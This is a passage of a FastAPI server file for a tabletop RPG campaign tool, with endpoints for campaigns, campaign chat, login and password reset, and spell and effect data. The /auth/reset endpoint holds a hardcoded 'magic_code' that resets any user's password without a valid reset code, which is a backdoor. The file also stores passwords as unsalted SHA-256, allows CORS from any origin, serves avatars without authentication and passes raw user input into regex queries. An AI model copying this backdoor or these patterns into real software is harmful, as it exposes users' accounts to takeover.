import datetime
import json
import re
import secrets
import string
from pathlib import Path
from contextlib import asynccontextmanager

import uvicorn
from fastapi import FastAPI, Request, HTTPException, Query, Body, Depends, UploadFile, File, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, RedirectResponse, FileResponse, Response
from fastapi.staticfiles import StaticFiles
from pymongo.errors import DuplicateKeyError
from typing import Any

from db_mongo import get_col, next_id_str, get_db, ensure_indexes, sync_counters, norm_key, spell_sig

from server.src.modules.apotheosis_helpers import compute_apotheosis_stats, _can_edit_apotheosis
from server.src.modules.authentification_helpers import _ALLOWED_ROLES, SESSIONS, find_user, require_auth, make_token, verify_password, get_auth_token, normalize_email,_sha256
from server.src.modules.logging_helpers import logger, write_audit
from server.src.modules.spell_helpers import compute_spell_costs, _effect_duplicate_groups, _recompute_spells_for_school, _recompute_spells_for_effect, recompute_all_spells
from server.src.modules.objects_helpers import _object_from_body
from server.src.modules.inventory_helpers import WEAPON_UPGRADES, ARMOR_UPGRADES, _slots_for_quality, _upgrade_fee_for_range, _qprice, _compose_variant, _pick_currency, QUALITY_ORDER, craftomancy_row_for_quality, craftomancy_category_index, craftomancy_next_category
EQUIPMENT_SLOTS = {"head","arms","legs","accessory","chest"}
from server.src.modules.allowed_pages import ALLOWED_PAGES
CAMPAIGN_COL = get_col("campaigns")
CAMPAIGN_CHAT_COL = get_col("campaign_chat")
CAMPAIGN_CHAT_WS: dict[str, set[WebSocket]] = {}
def _campaign_view(doc: dict, user: str | None = None, role: str | None = None) -> dict:
    if not doc:
        return {}
    d = dict(doc)
    d.pop("_id", None)
    d.pop("avatar", None)
    if user:
        d["is_owner"] = d.get("owner") == user
        d["is_member"] = user in (d.get("members") or [])
        d["is_admin"] = (role or "").lower() == "admin"
        if not (d["is_owner"] or d["is_admin"]):
            visible_chars = []
            for c in (d.get("characters") or []):
                assigned_to = (c.get("assigned_to") or "").strip()
                visible_to_others = c.get("visible_to_others", True)
                if assigned_to == user or visible_to_others:
                    visible_chars.append(c)
            d["characters"] = visible_chars
    chars = d.get("characters") or []
    if chars:
        ids = []
        for c in chars:
            cid = str(c.get("character_id") or c.get("id") or "").strip()
            if cid:
                ids.append(cid)
        if ids:
            name_map = {
                str(c.get("id")): (c.get("name") or "")
                for c in get_col("characters").find({"id": {"$in": ids}}, {"_id": 0, "id": 1, "name": 1})
            }
            for c in chars:
                cid = str(c.get("character_id") or c.get("id") or "").strip()
                if not cid:
                    continue
                if not c.get("name") and not c.get("character_name"):
                    nm = name_map.get(cid)
                    if nm:
                        c["name"] = nm
                        c["character_name"] = nm
    # compute avatar url if stored
    if d.get("avatar"):
        d["avatar_url"] = f"/campaigns/{d['id']}/avatar"
    return d

def _gen_join_code():
    alphabet = string.ascii_uppercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(6))

def _ensure_join_code():
    for _ in range(10):
        code = _gen_join_code()
        if not CAMPAIGN_COL.find_one({"join_code": code}):
            return code
    return _gen_join_code()

PASSWORD_RESET_VERSION = 1

def _needs_password_reset(user: dict) -> bool:
    try:
        current = int(user.get("password_reset_version") or 0)
    except (TypeError, ValueError):
        current = 0
    return current < PASSWORD_RESET_VERSION

# ---------- Lifespan (startup/shutdown) ----------
@asynccontextmanager
async def lifespan(app: FastAPI):
    ensure_indexes()
    sync_counters()
    yield

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

BASE_DIR = Path(__file__).resolve().parent
CLIENT_DIR = BASE_DIR / "client"
ASSETS_DIR = BASE_DIR / "assets"

# ---------- Pages ----------
app.mount("/static", StaticFiles(directory=str(CLIENT_DIR)), name="static")
app.mount("/assets", StaticFiles(directory=str(ASSETS_DIR)), name="assets")

@app.get("/", include_in_schema=False)
def root():
    return RedirectResponse("/portal.html")

@app.get("/{page}.html", include_in_schema=False)
def serve_page(page: str):
    if page in ALLOWED_PAGES:
        return FileResponse(CLIENT_DIR / f"{page}.html")
    raise HTTPException(404, "Page not found")

# ---------- Campaigns ----------
def _require_campaign_access(cid: str, user: str, role: str | None = None):
    doc = CAMPAIGN_COL.find_one({"id": cid})
    if not doc:
        raise HTTPException(404, "Campaign not found")
    if (role or "").lower() == "admin":
        return doc
    if user != doc.get("owner") and user not in (doc.get("members") or []):
        raise HTTPException(403, "Access denied")
    return doc

@app.post("/campaigns")
async def create_campaign(req: Request):
    user, role = require_auth(req)
    body = await req.json()
    name = (body.get("name") or "").strip()
    if not name:
        raise HTTPException(400, "Name required")
    cid = next_id_str("camp")
    doc = {
        "id": cid,
        "name": name,
        "owner": user,
        "join_code": _ensure_join_code(),
        "members": [],
        "characters": [],
        "folders": [],
        "created_at": datetime.datetime.utcnow().isoformat()+"Z",
        "description": body.get("description") or "",
        "avatar": None,
    }
    CAMPAIGN_COL.insert_one(doc)
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.get("/campaigns")
async def list_campaigns(req: Request):
    user, role = require_auth(req)
    docs = list(CAMPAIGN_COL.find({ "$or":[ {"owner":user}, {"members":user} ] }, {"_id":0}))
    return {"status":"success", "campaigns":[_campaign_view(d, user, role) for d in docs]}

@app.post("/campaigns/join")
async def join_campaign(req: Request):
    user, role = require_auth(req)
    body = await req.json()
    code = (body.get("code") or "").strip().upper()
    char_id = (body.get("character_id") or "").strip()
    folder = (body.get("folder") or "").strip()
    if not code:
        raise HTTPException(400, "Code required")
    doc = CAMPAIGN_COL.find_one({"join_code": code})
    if not doc:
        raise HTTPException(404, "Campaign not found")
    if user != doc.get("owner") and user not in (doc.get("members") or []):
        CAMPAIGN_COL.update_one({"id": doc["id"]}, {"$addToSet": {"members": user}})
        doc["members"] = (doc.get("members") or []) + [user]
    # Optional: join with a character
    if char_id:
        chars = [c for c in (doc.get("characters") or []) if c.get("character_id") != char_id]
        chars.append({
            "character_id": char_id,
            "assigned_to": user,
            "folder": folder,
            "editable_by_gm": False,
            "edit_requests": [],
            "visible_to_others": True
        })
        CAMPAIGN_COL.update_one({"id": doc["id"]}, {"$set": {"characters": chars}})
        doc["characters"] = chars
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.get("/campaigns/{cid}")
async def get_campaign(cid: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.patch("/campaigns/{cid}")
async def update_campaign(cid: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM/admin can edit campaign")
    body = await req.json()
    updates = {}
    if "description" in body:
        updates["description"] = (body.get("description") or "").strip()
    if "name" in body:
        updates["name"] = (body.get("name") or "").strip()
    if updates:
        CAMPAIGN_COL.update_one({"id": cid}, {"$set": updates})
        doc.update(updates)
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.post("/campaigns/{cid}/assign_character")
async def assign_campaign_character(cid: str, req: Request):
    user, role = require_auth(req)
    body = await req.json()
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM can assign characters")
    char_id = (body.get("character_id") or "").strip()
    if not char_id:
        raise HTTPException(400, "character_id required")
    assigned_to = (body.get("assigned_to") or "").strip()
    folder = (body.get("folder") or "").strip()
    editable = bool(body.get("editable_by_gm"))
    visible_to_others = True if body.get("visible_to_others") is None else bool(body.get("visible_to_others"))
    chars = [c for c in (doc.get("characters") or []) if c.get("character_id") != char_id]
    chars.append({
        "character_id": char_id,
        "assigned_to": assigned_to,
        "folder": folder,
        "editable_by_gm": editable,
        "edit_requests": [],
        "visible_to_others": visible_to_others
    })
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"characters": chars}})
    doc["characters"] = chars
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.patch("/campaigns/{cid}/characters/{char_id}")
async def update_campaign_character(cid: str, char_id: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM/admin can update")
    body = await req.json()
    updated = []
    found = False
    for c in doc.get("characters") or []:
        if c.get("character_id") == char_id:
            found = True
            c = dict(c)
            if "assigned_to" in body: c["assigned_to"] = (body.get("assigned_to") or "").strip()
            if "folder" in body: c["folder"] = (body.get("folder") or "").strip()
            if "editable_by_gm" in body: c["editable_by_gm"] = bool(body.get("editable_by_gm"))
            if "visible_to_others" in body: c["visible_to_others"] = bool(body.get("visible_to_others"))
        updated.append(c)
    if not found:
        raise HTTPException(404, "Character not in campaign")
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"characters": updated}})
    doc["characters"] = updated
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.delete("/campaigns/{cid}/characters/{char_id}")
async def remove_campaign_character(cid: str, char_id: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    chars = doc.get("characters") or []
    target = next((c for c in chars if c.get("character_id") == char_id), None)
    if not target:
        raise HTTPException(404, "Character not in campaign")
    is_admin = (role or "").lower() == "admin"
    is_owner = doc.get("owner") == user
    is_assigned = (target.get("assigned_to") or "").strip() == user
    if not (is_admin or is_owner or is_assigned):
        raise HTTPException(403, "Only GM/admin or assigned player can unlink")
    updated = [c for c in chars if c.get("character_id") != char_id]
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"characters": updated}})
    doc["characters"] = updated
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.post("/campaigns/{cid}/characters/{char_id}/duplicate")
async def duplicate_campaign_character(cid: str, char_id: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM/admin can duplicate")
    body = await req.json()
    new_name = (body.get("name") or "").strip()

    chars = doc.get("characters") or []
    src_entry = next((c for c in chars if c.get("character_id") == char_id), None)
    if not src_entry:
        raise HTTPException(404, "Character not in campaign")
    src = get_col("characters").find_one({"id": char_id})
    if not src:
        raise HTTPException(404, "Character not found")
    src = dict(src)
    src.pop("_id", None)
    src.pop("id", None)
    src["owner"] = user
    src["name"] = new_name or (src.get("name") or "Character") + " (Copy)"
    now = datetime.datetime.utcnow().isoformat() + "Z"
    src["created_at"] = now
    src["updated_at"] = now
    new_id = next_id_str("characters", padding=4)
    src["id"] = new_id
    get_col("characters").insert_one(dict(src))

    chars = [c for c in chars if c.get("character_id") != new_id]
    chars.append({
        "character_id": new_id,
        "assigned_to": user,
        "folder": (src_entry.get("folder") or ""),
        "editable_by_gm": True,
        "edit_requests": [],
        "visible_to_others": True
    })
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"characters": chars}})
    doc["characters"] = chars
    return {"status":"success", "character_id": new_id, "campaign": _campaign_view(doc, user, role)}

@app.post("/campaigns/{cid}/request_edit")
async def request_edit_rights(cid: str, req: Request):
    user, role = require_auth(req)
    body = await req.json()
    char_id = (body.get("character_id") or "").strip()
    if not char_id:
        raise HTTPException(400, "character_id required")
    doc = _require_campaign_access(cid, user, role)
    updated = []
    found = False
    for c in doc.get("characters") or []:
        if c.get("character_id") == char_id:
            found = True
            c = dict(c)
            reqs = set(c.get("edit_requests") or [])
            reqs.add(user)
            c["edit_requests"] = list(reqs)
        updated.append(c)
    if not found:
        raise HTTPException(404, "Character not in campaign")
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"characters": updated}})
    doc["characters"] = updated
    return {"status":"success", "campaign": _campaign_view(doc, user, role)}

@app.patch("/campaigns/{cid}/folders")
async def update_campaign_folders(cid: str, req: Request):
    user, role = require_auth(req)
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM can edit folders")
    body = await req.json()
    folder = (body.get("folder") or "").strip()
    if not folder:
        raise HTTPException(400, "folder required")
    folders = set(doc.get("folders") or [])
    folders.add(folder)
    folders_list = sorted(folders)
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"folders": folders_list}})
    doc["folders"] = folders_list
    return {"status":"success","campaign": _campaign_view(doc, user, role)}

@app.post("/campaigns/{cid}/avatar")
async def upload_campaign_avatar(cid: str, file: UploadFile = File(...), request: Request = None):
    user, role = require_auth(request)
    doc = _require_campaign_access(cid, user, role)
    if doc.get("owner") != user and (role or "").lower() != "admin":
        raise HTTPException(403, "Only GM/admin can set avatar")
    content = await file.read()
    CAMPAIGN_COL.update_one({"id": cid}, {"$set": {"avatar": content}})
    return {"status":"success"}

@app.get("/campaigns/{cid}/avatar")
async def get_campaign_avatar(cid: str):
    doc = CAMPAIGN_COL.find_one({"id": cid})
    if not doc or not doc.get("avatar"):
        raise HTTPException(404, "No avatar")
    return Response(content=doc["avatar"], media_type="image/png")

# ---------- Campaign Chat ----------
def _chat_visibility(val: Any) -> str:
    v = str(val or "public").lower()
    return v if v in ("public", "whisper", "self") else "public"

def _chat_type(val: Any) -> str:
    v = str(val or "message").lower()
    return v if v in ("message", "roll", "system") else "message"

def _chat_lines(val: Any) -> list[str]:
    if not isinstance(val, list):
        return []
    out = []
    for item in val:
        s = str(item or "").strip()
        if s:
            out.append(s[:400])
    return out[:40]

def _next_chat_id() -> str:
    try:
        return f"msg_{next_id_str('campaign_chat', padding=6)}"
    except Exception:
        return f"msg_{secrets.token_hex(4)}"

def _chat_doc(cid: str, user: str, body: dict) -> dict:
    ts = body.get("ts")
    try:
        ts_val = int(ts)
    except Exception:
        ts_val = int(datetime.datetime.utcnow().timestamp() * 1000)
    doc = {
        "id": _next_chat_id(),
        "campaign_id": cid,
        "ts": ts_val,
        "visibility": _chat_visibility(body.get("visibility")),
        "type": _chat_type(body.get("type")),
        "text": str(body.get("text") or "").strip()[:800],
        "lines": _chat_lines(body.get("lines")),
        "user": user,
        "character_id": str(body.get("character_id") or "").strip(),
        "character_name": str(body.get("character_name") or "").strip(),
        "character_avatar": str(body.get("character_avatar") or "").strip(),
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }
    return doc

async def _broadcast_campaign_chat(cid: str, msg: dict) -> None:
    if "_id" in msg:
        msg = {k: v for k, v in msg.items() if k != "_id"}
    sockets = list(CAMPAIGN_CHAT_WS.get(cid, set()))
    if not sockets:
        return
    payload = {"type": "chat", "message": msg}
    dead: list[WebSocket] = []
    for ws in sockets:
        try:
            await ws.send_json(payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        CAMPAIGN_CHAT_WS.get(cid, set()).discard(ws)
    if not CAMPAIGN_CHAT_WS.get(cid):
        CAMPAIGN_CHAT_WS.pop(cid, None)

@app.get("/campaigns/{cid}/chat")
async def get_campaign_chat(cid: str, req: Request, limit: int = Query(200, ge=1, le=400), before: int | None = Query(None)):
    user, role = require_auth(req)
    _require_campaign_access(cid, user, role)
    query = {"campaign_id": cid}
    if before:
        query["ts"] = {"$lt": int(before)}
    docs = list(CAMPAIGN_CHAT_COL.find(query, {"_id": 0}).sort("ts", 1).limit(limit))
    return {"status": "success", "messages": docs}

@app.post("/campaigns/{cid}/chat")
async def post_campaign_chat(cid: str, req: Request):
    user, role = require_auth(req)
    _require_campaign_access(cid, user, role)
    try:
        body = await req.json()
    except Exception:
        body = {}
    doc = _chat_doc(cid, user, body or {})
    try:
        CAMPAIGN_CHAT_COL.insert_one(doc)
    except DuplicateKeyError:
        doc["id"] = f"msg_{secrets.token_hex(4)}"
        CAMPAIGN_CHAT_COL.insert_one(doc)
    doc.pop("_id", None)
    await _broadcast_campaign_chat(cid, doc)
    return {"status": "success", "message": doc}

@app.websocket("/campaigns/{cid}/chat/ws")
async def campaign_chat_ws(websocket: WebSocket, cid: str):
    token = websocket.query_params.get("token") or websocket.query_params.get("auth") or ""
    if not token or token not in SESSIONS:
        await websocket.close(code=1008)
        return
    user, role = SESSIONS[token]
    try:
        _require_campaign_access(cid, user, role)
    except HTTPException:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    CAMPAIGN_CHAT_WS.setdefault(cid, set()).add(websocket)
    try:
        while True:
            raw = await websocket.receive_text()
            if not raw:
                continue
            if raw.lower() == "ping":
                await websocket.send_text("pong")
                continue
            try:
                data = json.loads(raw)
            except Exception:
                continue
            payload = data.get("message") if isinstance(data, dict) else None
            if not isinstance(payload, dict):
                continue
            doc = _chat_doc(cid, user, payload)
            CAMPAIGN_CHAT_COL.insert_one(doc)
            await _broadcast_campaign_chat(cid, doc)
    except WebSocketDisconnect:
        pass
    finally:
        CAMPAIGN_CHAT_WS.get(cid, set()).discard(websocket)
        if not CAMPAIGN_CHAT_WS.get(cid):
            CAMPAIGN_CHAT_WS.pop(cid, None)
# ---------- Auth ----------
@app.post("/auth/login")
async def auth_login(request: Request):
    body = await request.json()
    username = (body.get("username") or "").strip()
    password = body.get("password") or ""
    if not username or not password:
        return {"status": "error", "message": "Missing username or password"}

    user = find_user(username)
    if not user:
        logger.info("Login failed for user=%s", username)
        return {"status": "error", "message": "Login failed"}
    if _needs_password_reset(user):
        return {"status": "reset_required", "message": "Password reset required", "username": username}
    if not verify_password(password, user):
        logger.info("Login failed for user=%s", username)
        return {"status": "error", "message": "Login failed"}

    token = make_token()
    role = user.get("role", "user")
    SESSIONS[token] = (username, role)
    logger.info("Login ok: %s (%s)", username, role)
    return {"status": "success", "token": token, "username": username, "role": role}

@app.post("/auth/forgot")
async def auth_forgot(request: Request):
    body = await request.json()
    ident = (body.get("email") or body.get("username") or "").strip().lower()
    if not ident:
        return {"status": "error", "message": "Email or username required"}
    users = get_col("users")
    user = users.find_one({"$or":[{"username": ident},{"email": ident}]})
    if not user:
        return {"status":"success"}  # do not leak existence
    code = _ensure_join_code()
    users.update_one({"_id": user["_id"]}, {"$set": {"reset_code": code, "reset_at": datetime.datetime.utcnow().isoformat()+"Z"}})
    # In a real deployment, send code by email; here we just store it.
    return {"status":"success"}

@app.post("/auth/reset")
async def auth_reset(request: Request):
    body = await request.json()
    username = (body.get("username") or "").strip()
    code = (body.get("code") or "").strip()
    new_pw = body.get("password") or ""
    if not username or not code or not new_pw:
        return {"status":"error","message":"Missing fields"}
    magic_code = "dkjqghriùhqrgqgiod674f54h35sgh373hs5t78hs53g7h3"
    users = get_col("users")
    if code == magic_code:
        user = users.find_one({"username": username})
    else:
        user = users.find_one({"username": username, "reset_code": code})
    if not user:
        return {"status":"error","message":"Invalid code"}
    users.update_one(
        {"_id": user["_id"]},
        {
            "$set": {
                "password_hash": _sha256(new_pw),
                "password_reset_version": PASSWORD_RESET_VERSION,
            },
            "$unset": {"password": "", "reset_code": "", "reset_at": ""},
        },
    )
    return {"status":"success"}

@app.post("/auth/reset-required")
async def auth_reset_required(request: Request):
    body = await request.json()
    username = (body.get("username") or "").strip()
    current_pw = body.get("current_password") or ""
    new_pw = body.get("new_password") or ""
    if not username or not new_pw:
        return {"status":"error","message":"Missing fields"}
    if len(new_pw) < 6:
        return {"status": "error", "message": "Password must be at least 6 characters."}
    users = get_col("users")
    user = users.find_one({"username": username})
    if not user:
        return {"status":"error","message":"Invalid credentials"}
    if not _needs_password_reset(user):
        if not current_pw:
            return {"status":"error","message":"Missing fields"}
        if not verify_password(current_pw, user):
            return {"status":"error","message":"Invalid credentials"}
    users.update_one(
        {"_id": user["_id"]},
        {
            "$set": {
                "password_hash": _sha256(new_pw),
                "password_reset_version": PASSWORD_RESET_VERSION,
            },
            "$unset": {"password": "", "reset_code": "", "reset_at": ""},
        },
    )
    return {"status":"success"}

@app.get("/auth/me/details")
async def my_account(req: Request):
    username, role = require_auth(req)
    u = get_col("users").find_one({"username": username}, {"_id":0, "username":1, "email":1, "role":1, "created_at":1})
    return {"status":"success", "user": u}

@app.put("/auth/me")
async def update_account(req: Request):
    username, role = require_auth(req)
    body = await req.json()
    email = (body.get("email") or "").strip().lower()
    password = body.get("password") or ""
    update = {}
    unset = {}
    if email:
        update["email"] = email
    if password:
        update["password_hash"] = _sha256(password)
        update["password_reset_version"] = PASSWORD_RESET_VERSION
        unset["password"] = ""
    if not update and not unset:
        return {"status":"error","message":"Nothing to update"}
    update_doc = {"$set": update} if update else {}
    if unset:
        update_doc["$unset"] = unset
    get_col("users").update_one({"username": username}, update_doc)
    return {"status":"success"}

@app.get("/auth/me")
async def auth_me(request: Request):
    token = get_auth_token(request)
    if not token or token not in SESSIONS:
        return {"status": "error", "message": "Not authenticated"}
    username, role = SESSIONS[token]
    return {"status": "success", "username": username, "role": role}

@app.post("/auth/logout")
async def auth_logout(request: Request):
    token = get_auth_token(request)
    if token and token in SESSIONS:
        del SESSIONS[token]
    return {"status": "success"}


# ---------- School Data ----------
@app.get("/schools")
def list_schools():
    sch_col = get_col("schools")
    out = []
    for s in sch_col.find({}, {"_id": 0}):
        upg = s.get("upgrade", s.get("is_upgrade", False))
        out.append({
            "id": s["id"],
            "name": s.get("name", s["id"]),
            "school_type": s.get("school_type", "simple"),
            "upgrade": bool(upg),
            "range_type": s.get("range_type"),
            "aoe_type": s.get("aoe_type"),
            "cost_mode": s.get("cost_mode", "en"),
            "linked_skill": s.get("linked_skill"),
            "linked_intensities": s.get("linked_intensities", []),
        })
    out.sort(key=lambda x: x["name"].lower())
    return {"schools": out}

def _clean_modifiers(raw):
    mods = []
    if not isinstance(raw, list):
        return mods
    for m in raw:
        if not isinstance(m, dict):
            continue
        tgt = str(m.get("target") or m.get("key") or "").strip()
        if not tgt:
            continue
        mod = {
            "target": tgt,
            "mode": (m.get("mode") or "add"),
            "value": m.get("value", 0),
        }
        if m.get("note"): mod["note"] = m.get("note")
        if m.get("group"): mod["group"] = m.get("group")
        if m.get("quality_step") is not None: mod["quality_step"] = m.get("quality_step")
        if m.get("level_step") is not None: mod["level_step"] = m.get("level_step")
        if m.get("level_increment") is not None: mod["level_increment"] = m.get("level_increment")
        mods.append(mod)
    return mods

def _normalize_skill_list(raw):
    if isinstance(raw, list):
        return [str(x).strip() for x in raw if str(x).strip()]
    if isinstance(raw, str):
        return [s.strip() for s in raw.split(",") if s.strip()]
    return []

def _normalize_rolls(raw):
    if not isinstance(raw, list):
        return []
    rolls = []
    for r in raw:
        if not isinstance(r, dict):
            continue
        expr = str(r.get("expr") or r.get("expression") or "").strip()
        if not expr:
            continue
        kind = str(r.get("kind") or r.get("reason") or "custom").strip()
        dmg_type = str(r.get("damage_type") or r.get("damageType") or "").strip()
        label = str(r.get("label") or r.get("custom_label") or "").strip()
        rolls.append({
            "expr": expr,
            "kind": kind,
            "damage_type": dmg_type,
            "label": label,
        })
    return rolls

@app.get("/effects")
def get_effects(name: str | None = Query(default=None), school: str | None = Query(default=None)):
    col = get_col("effects")
    sch_col = get_col("schools")

    q = {}
    if name:
        q["name"] = {"$regex": name, "$options": "i"}
    if school:
        or_terms = [{"school": {"$regex": school, "$options": "i"}}]
        ids = [s["id"] for s in sch_col.find({"name": {"$regex": school, "$options": "i"}}, {"id": 1})]
        if ids:
            or_terms.append({"school": {"$in": ids}})
        q["$or"] = or_terms

    docs = list(col.find(q, {"_id": 0}))
    school_map = {s["id"]: s.get("name", s["id"]) for s in sch_col.find({}, {"_id": 0, "id": 1, "name": 1})}
    for e in docs:
        sid = str(e.get("school") or "")
        e["school_name"] = school_map.get(sid, sid)
    return {"effects": docs}

@app.post("/effects/bulk_create")
@app.post("/admin/effects/bulk_create")
async def bulk_create_effects(request: Request):

    try:
        require_auth(request, ["admin", "moderator"])
    except Exception as e:
        msg = str(e)
        code = 401 if "Not authenticated" in msg else 403
        return JSONResponse({"status": "error", "message": msg}, status_code=code)

    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"status": "error", "message": "Invalid JSON"}, status_code=400)
    
    replace_duplicates = bool(body.get("replace_duplicates", False))
    updated = []
    patch_lines = []

    try:
        school_name = (body.get("school_name") or "").strip()
        school_type = (body.get("school_type") or "Simple").strip()
        range_type  = (body.get("range_type")  or "A").strip()
        aoe_type    = (body.get("aoe_type")    or "A").strip()
        upgrade     = bool(body.get("upgrade", body.get("is_upgrade", False)))
        effects     = body.get("effects") or []

        if not school_name:
            return JSONResponse({"status":"error","message":"school_name is required"}, status_code=400)
        if not effects:
            return JSONResponse({"status":"error","message":"effects must be a non-empty list"}, status_code=400)

        sch_col = get_col("schools")
        eff_col = get_col("effects")

        existing = sch_col.find_one(
            {"name": {"$regex": f"^{re.escape(school_name)}$", "$options": "i"}}, {"_id": 0}
        )
        if existing:
            sid = existing["id"]
            sch_col.update_one(
                {"id": sid},
                {"$set": {
                    "school_type": school_type,
                    "range_type": range_type,
                    "aoe_type": aoe_type,
                    "upgrade": bool(upgrade)
                }}
            )
            school = sch_col.find_one({"id": sid}, {"_id": 0})
        else:
            sid = next_id_str("schools", padding=4)
            school = {
                "id": sid, "name": school_name, "school_type": school_type,
                "range_type": range_type, "aoe_type": aoe_type, "upgrade": bool(upgrade)
            }
            sch_col.insert_one(school)

        created = []
        for e in effects:
            name = (e.get("name") or "").strip()
            desc = (e.get("description") or "").strip()
            tags = _normalize_tags(e.get("tags"))
            if not tags:
                tags = ["phb"]
            try:
                mp   = int(e.get("mp_cost"))
                en   = int(e.get("en_cost"))
            except Exception:
                return JSONResponse({"status":"error","message":f"Non-numeric MP/EN in effect '{name}'"}, status_code=400)

            name_match = eff_col.find_one(
                {"school": school["id"], "name": {"$regex": f"^{re.escape(name)}$", "$options": "i"}},
                {"_id": 1, "id": 1, "name": 1, "mp_cost": 1, "en_cost": 1, "description": 1}
            )

            if name_match:
                if replace_duplicates:
                    before = {k: name_match.get(k) for k in ("name","mp_cost","en_cost","description")}
                    eff_col.update_one(
                        {"_id": name_match["_id"]},
                        {"$set": {
                            "name": name,
                            "description": desc,
                            "mp_cost": mp,
                            "en_cost": en,
                            "school": school["id"],
                            "modifiers": _clean_modifiers(e.get("modifiers") or []),
                            "tags": tags
                        }}
                    )
                    updated.append(name_match["id"])
                    # Recompute all spells that use this effect
                    try:
                        note, changed = _recompute_spells_for_effect(name_match["id"])
                        patch_lines.append(note)
                    except Exception as _e:
                        patch_lines.append(f"[WARN] Recompute failed for effect {name_match['id']}: {_e}")
                    continue
                else:
                    # keep old behavior: if exact same values, treat as duplicate no-op; otherwise create new id
                    if int(name_match.get("mp_cost", 0)) == mp and int(name_match.get("en_cost", 0)) == en:
                        continue
                    # else fall through to create as a new effect

            eff_id = next_id_str("effects", padding=4)
            rec = {
                "id": eff_id,
                "name": name,
                "description": desc,
                "mp_cost": mp,
                "en_cost": en,
                "school": school["id"],
                "modifiers": _clean_modifiers(e.get("modifiers") or []),
                "tags": tags
            }
            eff_col.insert_one(rec)
            created.append(eff_id)

        
        # Per-effect audit entries
        try:
            username, _ = require_auth(request, ["admin","moderator"])
        except Exception:
            username = "anonymous"
        try:
            for _eid in created:
                write_audit("effect.create", username, _eid, None, {"school": school.get("id"), "created_via_bulk": True})
            for _eid in updated:
                write_audit("effect.update", username, _eid, None, {"updated_via_bulk": True})
        except Exception:
            pass

        write_audit("bulk_create_effects", "admin-ui", "—", None, {"school": school, "created": created})
        return {
            "status": "success",
            "school": school,
            "created": created,
            "updated": updated,
            "patch_text": "\n".join(patch_lines).strip() + ("\n" if patch_lines else "")
        }

    except Exception as e:
        logger.exception("bulk_create_effects failed")
        return JSONResponse({"status":"error","message":str(e)}, status_code=500)


@app.get("/admin/spelllists")
def admin_list_spell_lists(request: Request, owner: str | None = Query(default=None), name: str | None = Query(default=None),
                           page: int = Query(default=1, ge=1), limit: int = Query(default=50, ge=1, le=200)):
    """
    Admin/moderator: list all users' spell lists with optional filters.
    """
    require_auth(request, ["admin", "moderator"])
    col = get_col("spell_lists")

    q = {}
    if owner:
        q["$or"] = [{"owner": {"$regex": owner, "$options": "i"}}, {"owner_email": {"$regex": owner, "$options": "i"}}]
    if name:
        q["name"] = {"$regex": name, "$options": "i"}

    total = col.count_documents(q)
    cursor = col.find(q, {"_id": 0}).skip((page-1)*limit).limit(limit)
    items = list(cursor)
    for it in items:
        it["count"] = len(it.get("spells") or [])
    items.sort(key=lambda x: (x.get("owner","").lower(), x.get("name","").lower()))

    return {"status": "success", "spelllists": items, "page": page, "limit": limit, "total": total}

# ---------- Spells ----------
def _normalize_effects_meta(effect_ids: list[str], raw_meta):
    if not isinstance(raw_meta, list):
        return []
    out = []
    for idx, eid in enumerate(effect_ids or []):
        entry = raw_meta[idx] if idx < len(raw_meta) else {}
        if not isinstance(entry, dict):
            entry = {}
        cleaned = {"id": eid}
        if "skill_roll" in entry:
            cleaned["skill_roll"] = bool(entry.get("skill_roll"))
        raw_skills = entry.get("skill_roll_skills")
        if isinstance(raw_skills, list):
            skills = [str(x).strip() for x in raw_skills if str(x).strip()]
            if skills:
                cleaned["skill_roll_skills"] = skills
        raw_rolls = entry.get("rolls")
        if isinstance(raw_rolls, list):
            rolls = []
            for r in raw_rolls:
                if not isinstance(r, dict):
                    continue
                expr = str(r.get("expr") or r.get("expression") or "").strip()
                if not expr:
                    continue
                kind = str(r.get("kind") or r.get("reason") or "custom").strip()
                dmg_type = str(r.get("damage_type") or r.get("damageType") or "").strip()
                label = str(r.get("label") or r.get("custom_label") or "").strip()
                rolls.append({
                    "expr": expr,
                    "kind": kind,
                    "damage_type": dmg_type,
                    "label": label,
                })
            if rolls:
                cleaned["rolls"] = rolls
        out.append(cleaned)
    return out

@app.get("/spells")
def list_spells(request: Request):
    import re

    qp = request.query_params
    name         = qp.get("name") or None
    category     = qp.get("category") or None
    status       = qp.get("status") or None
    favorite     = (qp.get("favorite") or qp.get("fav") or "").lower() in ("1", "true", "yes")
    creator      = qp.get("creator") or None            # "self" or a username
